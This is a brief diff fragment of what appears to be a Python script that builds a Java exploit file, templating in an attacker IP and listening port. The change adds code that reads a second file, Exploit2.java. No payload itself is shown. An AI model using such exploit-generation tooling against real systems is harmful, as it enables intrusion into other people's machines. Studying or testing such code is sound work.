@@ -53,6 +53,9 @@ public class Exploit {
 }
 """ % (userip, lport)
 
+    java_file = open("./Exploit2.java")
+    program = java_file.read()
+
     # writing the exploit to Exploit.java file
 
     p = Path("Exploit.java")
